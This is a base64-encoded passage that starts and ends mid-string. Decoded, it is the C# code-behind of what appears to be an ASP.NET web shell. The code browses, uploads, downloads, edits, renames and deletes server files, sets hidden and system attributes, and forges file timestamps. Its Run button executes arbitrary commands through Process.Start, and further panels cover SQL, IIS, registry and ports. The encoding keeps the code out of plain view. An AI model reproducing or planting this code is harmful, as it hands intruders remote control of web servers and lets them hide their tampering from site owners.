T58PGEgaHJlZj1qYXZhc2NyaXB0OkNvbW1hbmQoJ2RlbGRpcicsJyIgKyBmb2xkZXJuYW1lICsgIicpOz5EZWw8L2E+PC90ZD4iOwogICAgICAgICAgICAgICAgdG1wc3RyICs9ICI8L3RyPiI7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgZm9yZWFjaCAoRmlsZUluZm8gQmluX2ZpbGUgaW4gQmluX2Rpci5HZXRGaWxlcygpKQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICBzdHJpbmcgZmlsZW5hbWUgPSBmb3JtYXRwYXRoKEJpbl9wYXRoKSArICIvIiArIGZvcm1hdGZpbGUoQmluX2ZpbGUuTmFtZSk7CiAgICAgICAgICAgICAgICB0bXBzdHIgKz0gIjx0cj4iOwogICAgICAgICAgICAgICAgdG1wc3RyICs9ICI8dGQ+IiArIEJpbl9maWxlLk5hbWUgKyAiPC90ZD48dGQ+IiArIEJpbl9maWxlLkxlbmd0aCArICI8L3RkPjx0ZD4iICsgRGlyZWN0b3J5LkdldExhc3RXcml0ZVRpbWUoQmluX3BhdGggKyAiLyIgKyBCaW5fZmlsZS5OYW1lKSArICI8L3RkPjx0ZD48YSBocmVmPWphdmFzY3JpcHQ6Q29tbWFuZCgnZWRpdCcsJyIgKyBmaWxlbmFtZSArICInKTs+RWRpdDwvYT58PGEgaHJlZj1qYXZhc2NyaXB0OkNvbW1hbmQoJ3JlbmFtZScsJyIgKyBmaWxlbmFtZSArICInKTs+UmVuPC9hPnw8YSBocmVmPWphdmFzY3JpcHQ6Q29tbWFuZCgnZG93bicsJyIgKyBmaWxlbmFtZSArICInKTs+RG93bjwvYT58PGEgaHJlZj1qYXZhc2NyaXB0OkNvbW1hbmQoJ3Nob3dhdHQnLCciICsgZmlsZW5hbWUgKyAiJyk7PkF0dDwvYT58PGEgaHJlZj1qYXZhc2NyaXB0OkNvbW1hbmQoJ2RlbCcsJyIgKyBmaWxlbmFtZSArICInKTs+RGVsPC9hPjwvdGQ+IjsKICAgICAgICAgICAgICAgIHRtcHN0ciArPSAiPC90cj4iOwogICAgICAgICAgICB9CiAgICAgICAgICAgIHRtcHN0ciArPSAiPC90YWxiZT4iOwogICAgICAgIH0KICAgICAgICBjYXRjaCAoRXhjZXB0aW9uIEVycm9yKQogICAgICAgIHsKICAgICAgICAgICAgQmluX0Vycm9yKEVycm9yLk1lc3NhZ2UpOwoKICAgICAgICB9CgogICAgICAgIEJpbl9GaWxlbGlzdExhYmVsLlRleHQgPSBCaW5fRmlsZWxpc3QgKyB0bXBzdHI7CiAgICB9CiAgICBwdWJsaWMgdm9pZCBCaW5fRmlsZWRlbChzdHJpbmcgaW5zdHIsaW50IHR5cGUpCiAgICB7CiAgICAgICAgdHJ5CiAgICAgICAgewogICAgICAgICAgICBpZiAodHlwZSA9PSAxKQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICBGaWxlLkRlbGV0ZShpbnN0cik7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgaWYgKHR5cGUgPT0gMikKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgZm9yZWFjaCAoc3RyaW5nIHRtcCBpbiBEaXJlY3RvcnkuR2V0RmlsZVN5c3RlbUVudHJpZXMoaW5zdHIpKQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgIGlmIChGaWxlLkV4aXN0cyh0bXApKQogICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgRmlsZS5EZWxldGUodG1wKTsKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgZWxzZQogICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgQmluX0ZpbGVkZWwodG1wLCAyKTsKICAgICAgICAgICAgICAgICAgICB9ICAKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIERpcmVjdG9yeS5EZWxldGUoaW5zdHIpOyAgCiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgY2F0Y2ggKEV4Y2VwdGlvbiBFcnJvcikKICAgICAgICB7CiAgICAgICAgICAgIEJpbl9FcnJvcihFcnJvci5NZXNzYWdlKTsKICAgICAgICB9CiAgICAgICAgQmluX0ZpbGVMaXN0KEJpbl91cFRleHRCb3guVGV4dCk7IAogICAgfQogICAgcHVibGljIHZvaWQgQmluX0ZpbGVSTihzdHJpbmcgaW5zdHIsaW50IHR5cGUpIAogICAgewogICAgICAgIHRyeQogICAgICAgIHsKICAgICAgICAgICAgaWYgKHR5cGUgPT0gMSkKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgc3RyaW5nW10gYXJyYXkgPSBpbnN0ci5TcGxpdCgnLCcpOwoKICAgICAgICAgICAgICAgIEZpbGUuTW92ZShhcnJheVswXSwgYXJyYXlbMV0pOwogICAgICAgICAgICB9CiAgICAgICAgICAgIGlmICh0eXBlID09IDIpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIHN0cmluZ1tdIGFycmF5ID0gaW5zdHIuU3BsaXQoJywnKTsKICAgICAgICAgICAgICAgIERpcmVjdG9yeS5Nb3ZlKGFycmF5WzBdLCBhcnJheVsxXSk7CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgY2F0Y2ggKEV4Y2VwdGlvbiBFcnJvcikKICAgICAgICB7CiAgICAgICAgICAgIEJpbl9FcnJvcihFcnJvci5NZXNzYWdlKTsKICAgICAgICB9CiAgICAgICAgQmluX0ZpbGVMaXN0KEJpbl91cFRleHRCb3guVGV4dCk7CiAgICB9CiAgICBwdWJsaWMgdm9pZCBCaW5fRmlsZWRvd24oc3RyaW5nIGluc3RyKSAKICAgIHsKICAgICAgICB0cnkKICAgICAgICB7CiAgICAgICAgICAgIEZpbGVTdHJlYW0gTXlGaWxlU3RyZWFtID0gbmV3IEZpbGVTdHJlYW0oaW5zdHIsIEZpbGVNb2RlLk9wZW4sIEZpbGVBY2Nlc3MuUmVhZCwgRmlsZVNoYXJlLlJlYWQpOwogICAgICAgICAgICBsb25nIEZpbGVTaXplID0gTXlGaWxlU3RyZWFtLkxlbmd0aDsKICAgICAgICAgICAgYnl0ZVtdIEJ1ZmZlciA9IG5ldyBieXRlWyhpbnQpRmlsZVNpemVdOwogICAgICAgICAgICBNeUZpbGVTdHJlYW0uUmVhZChCdWZmZXIsIDAsIChpbnQpRmlsZVNpemUpOwogICAgICAgICAgICBNeUZpbGVTdHJlYW0uQ2xvc2UoKTsKICAgICAgICAgICAgUmVzcG9uc2UuQWRkSGVhZGVyKCJDb250ZW50LURpc3Bvc2l0aW9uIiwgImF0dGFjaG1lbnQ7ZmlsZW5hbWU9IiArIGluc3RyKTsKICAgICAgICAgICAgUmVzcG9uc2UuQ2hhcnNldCA9ICJVVEYtOCI7CiAgICAgICAgICAgIFJlc3BvbnNlLkNvbnRlbnRUeXBlID0gImFwcGxpY2F0aW9uL29jdGV0LXN0cmVhbSI7CiAgICAgICAgICAgIFJlc3BvbnNlLkJpbmFyeVdyaXRlKEJ1ZmZlcik7CiAgICAgICAgICAgIFJlc3BvbnNlLkZsdXNoKCk7CiAgICAgICAgICAgIFJlc3BvbnNlLkVuZCgpOwogICAgICAgIH0KICAgICAgICBjYXRjaCAoRXhjZXB0aW9uIEVycm9yKQogICAgICAgIHsKICAgICAgICAgICAgQmluX0Vycm9yKEVycm9yLk1lc3NhZ2UpOyAKICAgICAgICB9CiAgICAgICAgCiAgICB9CiAgICBwdWJsaWMgdm9pZCBCaW5fRmlsZWF0dChzdHJpbmcgaW5zdHIpCiAgICB7CiAgICAgICAgQmluX0F0dFBhbmVsLlZpc2libGUgPSB0cnVlOwogICAgICAgIEJpbl9GaWxlUGFuZWwuVmlzaWJsZSA9IHRydWU7CiAgICAgICAgdHJ5CiAgICAgICAgewogICAgICAgICAgICBzdHJpbmcgQXR0ID0gRmlsZS5HZXRBdHRyaWJ1dGVzKGluc3RyKS5Ub1N0cmluZygpOwogICAgICAgICAgICBCaW5fUmVhZE9ubHlDaGVja0JveC5DaGVja2VkID0gZmFsc2U7CiAgICAgICAgICAgIEJpbl9TeXN0ZW1DaGVja0JveC5DaGVja2VkID0gZmFsc2U7CiAgICAgICAgICAgIEJpbl9IaWRkZW5DaGVja0JveC5DaGVja2VkID0gZmFsc2U7CiAgICAgICAgICAgIEJpbl9BcmNoaXZlQ2hlY2tCb3guQ2hlY2tlZCA9IGZhbHNlOwoKICAgICAgICAgICAgaWYgKEF0dC5MYXN0SW5kZXhPZigiUmVhZE9ubHkiKSAhPSAtMSkKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgQmluX1JlYWRPbmx5Q2hlY2tCb3guQ2hlY2tlZCA9IHRydWU7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgaWYgKEF0dC5MYXN0SW5kZXhPZigiU3lzdGVtIikgIT0gLTEpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIEJpbl9TeXN0ZW1DaGVja0JveC5DaGVja2VkID0gdHJ1ZTsKICAgICAgICAgICAgfQogICAgICAgICAgICBpZiAoQXR0Lkxhc3RJbmRleE9mKCJIaWRkZW4iKSAhPSAtMSkKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgQmluX0hpZGRlbkNoZWNrQm94LkNoZWNrZWQgPSB0cnVlOwogICAgICAgICAgICB9CiAgICAgICAgICAgIGlmIChBdHQuTGFzdEluZGV4T2YoIkFyY2hpdmUiKSAhPSAtMSkKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgQmluX0FyY2hpdmVDaGVja0JveC5DaGVja2VkID0gdHJ1ZTsKICAgICAgICAgICAgfQogICAgICAgICAgICBCaW5fQ3JlYXRpb25UaW1lVGV4dEJveC5UZXh0ID0gRmlsZS5HZXRDcmVhdGlvblRpbWUoaW5zdHIpLlRvU3RyaW5nKCk7CiAgICAgICAgICAgIEJpbl9MYXN0V3JpdGVUaW1lVGV4dEJveC5UZXh0ID0gRmlsZS5HZXRMYXN0V3JpdGVUaW1lKGluc3RyKS5Ub1N0cmluZygpOwogICAgICAgICAgICBCaW5fQWNjZXNzVGltZVRleHRCb3guVGV4dCA9IEZpbGUuR2V0TGFzdEFjY2Vzc1RpbWUoaW5zdHIpLlRvU3RyaW5nKCk7CiAgICAgICAgfQogICAgICAgIGNhdGNoIChFeGNlcHRpb24gRXJyb3IpCiAgICAgICAgewogICAgICAgICAgICBCaW5fRXJyb3IoRXJyb3IuTWVzc2FnZSk7CiAgICAgICAgfQogICAgICAgIEJpbl9BdHRMYWJlbC5UZXh0ID0gaW5zdHI7CiAgICAgICAgU2Vzc2lvblsiRmlsZU5hbWUiXSA9IGluc3RyOwogICAgICAgIEJpbl9Ecml2ZUxpc3QoKTsKICAgIH0KICAgIHB1YmxpYyB2b2lkIEJpbl9GaWxlRWRpdChzdHJpbmcgaW5zdHIpCiAgICB7CiAgICAgICAgQmluX0ZpbGVQYW5lbC5WaXNpYmxlID0gdHJ1ZTsKICAgICAgICBCaW5fRWRpdFBhbmVsLlZpc2libGUgPSB0cnVlOwogICAgICAgIEJpbl9Ecml2ZUxpc3QoKTsKICAgICAgICBCaW5fRWRpdHBhdGhUZXh0Qm94LlRleHQgPSBpbnN0cjsKICAgICAgICBTdHJlYW1SZWFkZXIgU1IgPSBuZXcgU3RyZWFtUmVhZGVyKGluc3RyLCBFbmNvZGluZy5EZWZhdWx0KTsKICAgICAgICBCaW5fRWRpdFRleHRCb3guVGV4dCA9IFNSLlJlYWRUb0VuZCgpOwogICAgICAgIFNSLkNsb3NlKCk7CiAgICB9CiAgICBwcm90ZWN0ZWQgdm9pZCBCaW5fdXBCdXR0b25fQ2xpY2sob2JqZWN0IHNlbmRlciwgRXZlbnRBcmdzIGUpCiAgICB7CiAgICAgICAKICAgICAgICAgICAgc3RyaW5nIHVwcGF0aCA9IEJpbl91cFRleHRCb3guVGV4dDsKICAgICAgICAgICAgaWYgKHVwcGF0aC5TdWJzdHJpbmcodXBwYXRoLkxlbmd0aCAtIDEsIDEpICE9IEAiLyIpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIHVwcGF0aCA9IHVwcGF0aCArIEAiLyI7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgdHJ5CiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIEJpbl9VcEZpbGUuUG9zdGVkRmlsZS5TYXZlQXModXBwYXRoICsgUGF0aC5HZXRGaWxlTmFtZShCaW5fVXBGaWxlLlZhbHVlKSk7CiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgfQogICAgICAgICAgICBjYXRjaCAoRXhjZXB0aW9uIGVycm9yKQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICBCaW5fRXJyb3IoZXJyb3IuTWVzc2FnZSk7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgQmluX0ZpbGVMaXN0KHVwcGF0aCk7CiAgICB9CiAgICBwdWJsaWMgdm9pZCBCaW5fRXJyb3Ioc3RyaW5nIGVycm9yKQogICAgewogICAgICAgIEJpbl9FcnJvckxhYmVsLlRleHQgPSAiRXJyb3IgOiAiICsgZXJyb3I7CiAgICB9CiAgICBwdWJsaWMgc3RyaW5nIGZvcm1hdHBhdGgoc3RyaW5nIGluc3RyKQogICAgewogICAgICAgIGluc3RyID0gaW5zdHIuUmVwbGFjZShAIlwiLCAiLyIpOwogICAgICAgIGlmIChpbnN0ci5MZW5ndGggPCA0KQogICAgICAgIHsKICAgICAgICAgICAgaW5zdHIgPSBpbnN0ci5SZXBsYWNlKEAiLyIsICIiKTsKICAgICAgICB9CiAgICAgICAgaWYgKGluc3RyLkxlbmd0aCA9PSAyKQogICAgICAgIHsKICAgICAgICAgICAgaW5zdHIgPSBpbnN0ciArIEAiLyI7CiAgICAgICAgfQogICAgICAgIGluc3RyID0gaW5zdHIuUmVwbGFjZSgiICIsICIlMjAiKTsKICAgICAgICByZXR1cm4gaW5zdHI7CiAgICB9CiAgICBwdWJsaWMgc3RyaW5nIGZvcm1hdGZpbGUoc3RyaW5nIGluc3RyKQogICAgewogICAgICAgIGluc3RyID0gaW5zdHIuUmVwbGFjZSgiICIsICIlMjAiKTsKICAgICAgICByZXR1cm4gaW5zdHI7CiAgICAgIAogICAgfQogICAgcHJvdGVjdGVkIHZvaWQgQmluX0dvQnV0dG9uX0NsaWNrKG9iamVjdCBzZW5kZXIsIEV2ZW50QXJncyBlKQogICAgewogICAgICAgIEJpbl9GaWxlTGlzdChCaW5fdXBUZXh0Qm94LlRleHQpOwogICAgfQoKICAgIHByb3RlY3RlZCB2b2lkIEJpbl9OZXdGaWxlQnV0dG9uX0NsaWNrKG9iamVjdCBzZW5kZXIsIEV2ZW50QXJncyBlKQogICAgewogICAgICAgIHN0cmluZyBuZXdmaWxlID0gQmluX0NyZWF0ZVRleHRCb3guVGV4dDsKICAgICAgICBzdHJpbmcgZmlsZXBhdGggPSBCaW5fdXBUZXh0Qm94LlRleHQ7CiAgICAgICAgZmlsZXBhdGggPSBmaWxlcGF0aCArICIvIiArIG5ld2ZpbGU7CiAgICAgICAgdHJ5CiAgICAgICAgewogICAgICAgICAgICBTdHJlYW1Xcml0ZXIgc3cgPSBuZXcgU3RyZWFtV3JpdGVyKGZpbGVwYXRoLCB0cnVlLCBFbmNvZGluZy5EZWZhdWx0KTsKICAgICAgICAgICAgCiAgICAgICAgfQogICAgICAgIGNhdGNoIChFeGNlcHRpb24gRXJyb3IpCiAgICAgICAgewogICAgICAgICAgICBCaW5fRXJyb3IoRXJyb3IuTWVzc2FnZSk7CiAgICAgICAgfQogICAgICAgIEJpbl9GaWxlTGlzdChCaW5fdXBUZXh0Qm94LlRleHQpOwogICAgfQoKICAgIHByb3RlY3RlZCB2b2lkIEJpbl9OZXdkaXJCdXR0b25fQ2xpY2sob2JqZWN0IHNlbmRlciwgRXZlbnRBcmdzIGUpCiAgICB7CiAgICAgICAgc3RyaW5nIGRpcnBhdGggPSBCaW5fdXBUZXh0Qm94LlRleHQ7CiAgICAgICAgc3RyaW5nIG5ld2RpciA9IEJpbl9DcmVhdGVUZXh0Qm94LlRleHQ7CiAgICAgICAgbmV3ZGlyID0gZGlycGF0aCArICIvIiArIG5ld2RpcjsKICAgICAgICB0cnkKICAgICAgICB7CiAgICAgICAgICAgIERpcmVjdG9yeS5DcmVhdGVEaXJlY3RvcnkobmV3ZGlyKTsKICAgICAgICAgICAKICAgICAgICB9CiAgICAgICAgY2F0Y2goRXhjZXB0aW9uIEVycm9yKQogICAgICAgIHsKICAgICAgICAgICAgQmluX0Vycm9yKEVycm9yLk1lc3NhZ2UpOwogICAgICAgIH0KICAgICAgICBCaW5fRmlsZUxpc3QoQmluX3VwVGV4dEJveC5UZXh0KTsKICAgIH0KCiAgICBwcm90ZWN0ZWQgdm9pZCBCaW5fQ29weUJ1dHRvbl9DbGljayhvYmplY3Qgc2VuZGVyLCBFdmVudEFyZ3MgZSkKICAgIHsKICAgICAgICBzdHJpbmcgY29weXN0ciA9IEJpbl9Db3B5VGV4dEJveC5UZXh0OwogICAgICAgIHN0cmluZyBjb3B5dG8gPSBCaW5fQ29weXRvVGV4dEJveC5UZXh0OwogICAgICAgIHRyeQogICAgICAgIHsKICAgICAgICAgICAgRmlsZS5Db3B5KGNvcHlzdHIsIGNvcHl0byk7CiAgICAgICAgfQogICAgICAgIGNhdGNoIChFeGNlcHRpb24gRXJyb3IpCiAgICAgICAgewogICAgICAgICAgICAgQmluX0Vycm9yKEVycm9yLk1lc3NhZ2UpOwogICAgICAgIH0KICAgICAgICBCaW5fQ29weXRvVGV4dEJveC5UZXh0ID0gIiI7CiAgICAgICAgQmluX0ZpbGVMaXN0KEJpbl91cFRleHRCb3guVGV4dCk7CiAgICB9CgogICAgcHJvdGVjdGVkIHZvaWQgQmluX0N1dEJ1dHRvbl9DbGljayhvYmplY3Qgc2VuZGVyLCBFdmVudEFyZ3MgZSkKICAgIHsKICAgICAgICBzdHJpbmcgY29weXN0ciA9IEJpbl9Db3B5VGV4dEJveC5UZXh0OwogICAgICAgIHN0cmluZyBjb3B5dG8gPSBCaW5fQ29weXRvVGV4dEJveC5UZXh0OwogICAgICAgIHRyeQogICAgICAgIHsKICAgICAgICAgICAgRmlsZS5Nb3ZlKGNvcHlzdHIsIGNvcHl0byk7CiAgICAgICAgfQogICAgICAgIGNhdGNoIChFeGNlcHRpb24gRXJyb3IpCiAgICAgICAgewogICAgICAgICAgICBCaW5fRXJyb3IoRXJyb3IuTWVzc2FnZSk7CiAgICAgICAgfQogICAgICAgIEJpbl9Db3B5dG9UZXh0Qm94LlRleHQgPSAiIjsKICAgICAgICBCaW5fRmlsZUxpc3QoQmluX3VwVGV4dEJveC5UZXh0KTsKICAgIH0KCiAgICBwcm90ZWN0ZWQgdm9pZCBCaW5fU2V0QnV0dG9uX0NsaWNrKG9iamVjdCBzZW5kZXIsIEV2ZW50QXJncyBlKQogICAgewogICAgICAgIHRyeQogICAgICAgIHsKICAgICAgICAgICAgc3RyaW5nIEZpbGVOYW1lID0gU2Vzc2lvblsiRmlsZU5hbWUiXS5Ub1N0cmluZygpOwogICAgICAgICAgICBGaWxlLlNldEF0dHJpYnV0ZXMoRmlsZU5hbWUsIEZpbGVBdHRyaWJ1dGVzLk5vcm1hbCk7CiAgICAgICAgICAgIGlmIChCaW5fUmVhZE9ubHlDaGVja0JveC5DaGVja2VkKQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICBGaWxlLlNldEF0dHJpYnV0ZXMoRmlsZU5hbWUsIEZpbGVBdHRyaWJ1dGVzLlJlYWRPbmx5KTsKICAgICAgICAgICAgfQoKICAgICAgICAgICAgaWYgKEJpbl9TeXN0ZW1DaGVja0JveC5DaGVja2VkKQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICBGaWxlLlNldEF0dHJpYnV0ZXMoRmlsZU5hbWUsIEZpbGUuR2V0QXR0cmlidXRlcyhGaWxlTmFtZSkgfCBGaWxlQXR0cmlidXRlcy5TeXN0ZW0pOwogICAgICAgICAgICB9CiAgICAgICAgICAgIGlmIChCaW5fSGlkZGVuQ2hlY2tCb3guQ2hlY2tlZCkKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgRmlsZS5TZXRBdHRyaWJ1dGVzKEZpbGVOYW1lLCBGaWxlLkdldEF0dHJpYnV0ZXMoRmlsZU5hbWUpIHwgRmlsZUF0dHJpYnV0ZXMuSGlkZGVuKTsKICAgICAgICAgICAgfQogICAgICAgICAgICBpZiAoQmluX0FyY2hpdmVDaGVja0JveC5DaGVja2VkKQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICBGaWxlLlNldEF0dHJpYnV0ZXMoRmlsZU5hbWUsIEZpbGUuR2V0QXR0cmlidXRlcyhGaWxlTmFtZSkgfCBGaWxlQXR0cmlidXRlcy5BcmNoaXZlKTsKICAgICAgICAgICAgfQogICAgICAgICAgICBpZiAoRmlsZU5hbWUuU3Vic3RyaW5nKEZpbGVOYW1lLkxlbmd0aCAtIDEsIDEpID09ICIvIikKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgRGlyZWN0b3J5LlNldENyZWF0aW9uVGltZShGaWxlTmFtZSwgQ29udmVydC5Ub0RhdGVUaW1lKEJpbl9DcmVhdGlvblRpbWVUZXh0Qm94LlRleHQpKTsKICAgICAgICAgICAgICAgIERpcmVjdG9yeS5TZXRMYXN0V3JpdGVUaW1lKEZpbGVOYW1lLCBDb252ZXJ0LlRvRGF0ZVRpbWUoQmluX0xhc3RXcml0ZVRpbWVUZXh0Qm94LlRleHQpKTsKICAgICAgICAgICAgICAgIERpcmVjdG9yeS5TZXRMYXN0QWNjZXNzVGltZShGaWxlTmFtZSwgQ29udmVydC5Ub0RhdGVUaW1lKEJpbl9BY2Nlc3NUaW1lVGV4dEJveC5UZXh0KSk7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgZWxzZQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICBGaWxlLlNldENyZWF0aW9uVGltZShGaWxlTmFtZSwgQ29udmVydC5Ub0RhdGVUaW1lKEJpbl9DcmVhdGlvblRpbWVUZXh0Qm94LlRleHQpKTsKICAgICAgICAgICAgICAgIEZpbGUuU2V0TGFzdFdyaXRlVGltZShGaWxlTmFtZSwgQ29udmVydC5Ub0RhdGVUaW1lKEJpbl9MYXN0V3JpdGVUaW1lVGV4dEJveC5UZXh0KSk7CiAgICAgICAgICAgICAgICBGaWxlLlNldExhc3RBY2Nlc3NUaW1lKEZpbGVOYW1lLCBDb252ZXJ0LlRvRGF0ZVRpbWUoQmluX0FjY2Vzc1RpbWVUZXh0Qm94LlRleHQpKTsKICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICBjYXRjaCAoRXhjZXB0aW9uIEVycm9yKQogICAgICAgIHsKICAgICAgICAgICAgQmluX0Vycm9yKEVycm9yLk1lc3NhZ2UpOwogICAgICAgIH0KICAgICAgICBCaW5fRmlsZUxpc3QoQmluX3VwVGV4dEJveC5UZXh0KTsKICAgICAgICBSZXNwb25zZS5Xcml0ZSgiPHNjcmlwdD5hbGVydCgnU3VjY2VzcyEnKTwvc2MiICsgInJpcHQ+Iik7CiAgICB9CgogICAgcHJvdGVjdGVkIHZvaWQgQmluX0VkaXRCdXR0b25fQ2xpY2sob2JqZWN0IHNlbmRlciwgRXZlbnRBcmdzIGUpCiAgICB7CiAgICAgICAgdHJ5CiAgICAgICAgewogICAgICAgICAgICBTdHJlYW1Xcml0ZXIgU1cgPSBuZXcgU3RyZWFtV3JpdGVyKEJpbl9FZGl0cGF0aFRleHRCb3guVGV4dCwgZmFsc2UsIEVuY29kaW5nLkRlZmF1bHQpOwogICAgICAgICAgICBTVy5Xcml0ZShCaW5fRWRpdFRleHRCb3guVGV4dCk7CiAgICAgICAgICAgIFNXLkNsb3NlKCk7CiAgICAgICAgfQogICAgICAgIGNhdGNoIChFeGNlcHRpb24gRXJyb3IpCiAgICAgICAgewogICAgICAgICAgICBCaW5fRXJyb3IoRXJyb3IuTWVzc2FnZSk7IAogICAgICAgIH0KICAgICAgICBCaW5fRmlsZUxpc3QoQmluX3VwVGV4dEJveC5UZXh0KTsKICAgICAgICBSZXNwb25zZS5Xcml0ZSgiPHNjcmlwdD5hbGVydCgnU3VjY2VzcyEnKTwvc2MiICsgInJpcHQ+Iik7CiAgICAgICAgCiAgICB9CiAgICAKICAgIHByb3RlY3RlZCB2b2lkIEJpbl9CYWNrQnV0dG9uX0NsaWNrKG9iamVjdCBzZW5kZXIsIEV2ZW50QXJncyBlKQogICAgewogICAgICAgIEJpbl9GaWxlTGlzdChCaW5fdXBUZXh0Qm94LlRleHQpOwogICAgfQoKICAgIHByb3RlY3RlZCB2b2lkIEJpbl9TYmFja0J1dHRvbl9DbGljayhvYmplY3Qgc2VuZGVyLCBFdmVudEFyZ3MgZSkKICAgIHsKICAgICAgICBCaW5fRmlsZUxpc3QoQmluX3VwVGV4dEJveC5UZXh0KTsKICAgIH0KCiAgICBwcm90ZWN0ZWQgdm9pZCBCaW5fQ21kQnV0dG9uX0NsaWNrKG9iamVjdCBzZW5kZXIsIEV2ZW50QXJncyBlKQogICAgewogICAgICAgIEJpbl9NZW51UGFuZWwuVmlzaWJsZSA9IHRydWU7CiAgICAgICAgQmluX0xvZ2luUGFuZWwuVmlzaWJsZSA9IGZhbHNlOwogICAgICAgIEJpbl9DbWRQYW5lbC5WaXNpYmxlID0gdHJ1ZTsKICAgICAgICBCaW5fU1FMUGFuZWwuVmlzaWJsZSA9IGZhbHNlOwogICAgICAgIEJpbl9DbWRMYWJlbC5UZXh0ID0gIiI7CiAgICAgICAgQmluX1N1UGFuZWwuVmlzaWJsZSA9IGZhbHNlOwogICAgICAgIEJpbl9JSVNQYW5lbC5WaXNpYmxlID0gZmFsc2U7CiAgICAgICAgQmluX1JlZ1BhbmVsLlZpc2libGUgPSBmYWxzZTsKICAgICAgICBCaW5fUG9ydFBhbmVsLlZpc2libGUgPSBmYWxzZTsKICAgIH0KCiAgICBwcm90ZWN0ZWQgdm9pZCBCaW5fUnVuQnV0dG9uX0NsaWNrKG9iamVjdCBzZW5kZXIsIEV2ZW50QXJncyBlKQogICAgewogICAgICAgIHRyeQogICAgICAgIHsKICAgICAgICAgICAgUHJvY2VzcyBDbWRwcm8gPSBuZXcgUHJvY2VzcygpOwogICAgICAgICAgICBDbWRwcm8uU3RhcnRJbmZvLkZpbGVOYW1lID0gQmluX0NtZFBhdGhUZXh0Qm94LlRleHQ7CiAgICAgICAgICAgIENtZHByby5TdGFydEluZm8uQXJndW1lbnRzID0gQmluX0NtZFNoZWxsVGV4dEJveC5UZXh0OwogICAgICAgICAgICBDbWRwcm8uU3RhcnRJbmZvLlVzZVNoZWxsRXhlY3V0ZSA9IGZhbHNlOwogICAgICAgICAgICBDbWRwcm8uU3RhcnRJbmZvLlJlZGlyZWN0U3RhbmRhcmRJbnB1dCA9IHRydWU7CiAgICAgICAgICAgIENtZHByby5TdGFydEluZm8uUmVkaXJlY3RTdGFuZGFyZE91dHB1dCA9IHRydWU7CiAgICAgICAgICAgIENtZHByby5TdGFydEluZm8uUmVkaXJlY3RTdGFuZGFyZEVycm9yID0gdHJ1ZTsKICAgICAgICAgICAgQ21kcHJvLlN0YXJ0KCk7CiAgICAgICAgICAgIHN0cmluZyBjbWRzdHIgPSBDbWRwcm8uU3RhbmRhcmRPdXRwdXQuUmVhZFRvRW5kKCk7CiAgICAgICAgICAgIGNtZHN0ciA9IGNtZHN0ci5SZXBsYWNlKCI8IiwgIiZsdDsiKTsKICAgICAgICAgICAgY21kc3RyID0gY21kc3RyLlJlcGxhY2UoIj4iLCAiJmd0OyIpOwogICAgICAgICAgICBCaW5fQ21kTGFiZWwuVGV4dCA9ICI8aHI+PGRpdiBpZD1cImNtZFwiPjxwcmU+IiArIGNtZHN0ciArICI8L3ByZT48L2Rpdj4iOwogICAgICAgIH0KICAgICAgICBjYXRjaCAoRXhjZXB0aW9uIEVycm9yKQogICAgICAgIHsKICAgICAgICAgICAgQmluX0Vycm9yKEVycm9yLk1lc3NhZ2UpOyAKICAgICAgICB9ICAKICAgIH0KCiAgICBwcm90ZWN0ZWQgdm9pZCBCaW5fU1FMQnV0dG9uX0NsaWNrKG9iamVjdCBzZW5kZXIsIEV2ZW50QXJncyBlKQogICAgewogICAgICAgIEJpbl9DbWRQYW5lbC5WaXNpYmxlID0gZmFsc2U7CiAgICAgICAgQmluX1NRTFBhbmVsLlZpc2libGUgPSB0cnVlOwogICAgICAgIEJpbl9Mb2dpblBhbmVsLlZpc2libGUgPSBmYWxzZTsKICAgICAgICBCaW5fTWVudVBhbmVsLlZpc2libGUgPSB0cnVlOwogICAgICAgIEJpbl9BY2NQYW5lbC5WaXNpYmxlID0gZmFsc2U7CiAgICAgICAgQmluX1Njcm9sbC5WaXNpYmxlID0gZmFsc2U7CiAgICAgICAgQmluX0RCbWVudVBhbmVsLlZpc2libGUgPSBmYWxzZTsKICAgICAgICBCaW5fZGlyUGFuZWwuVmlzaWJsZSA9IGZhbHNlOwogICAgICAgIEJpbl9TdVBhbmVsLlZpc2libGUgPSBmYWxzZTsKICAgICAgICBCaW5fSUlTUGFuZWwuVmlzaWJsZSA9IGZhbHNlOwogICAgICAgIEJpbl9Qb3J0UGFuZWwuVmlzaWJsZSA9IGZhbHNlOwogICAgICAgIEJpbl9SZWdQYW5lbC5WaXNpYmxlID1mYWxzZTsKICAgIH0KCiAgICBwcm90ZWN0ZWQgdm9pZCBCaW5fU1FMUmFkaW9CdXR0b25fQ2hlY2tlZENoYW5nZWQob2JqZWN0IHNlbmRlciwgRXZlbnRBcmdzIGUpCiAgICB7CiAgICAgICAgU2Vzc2lvblsi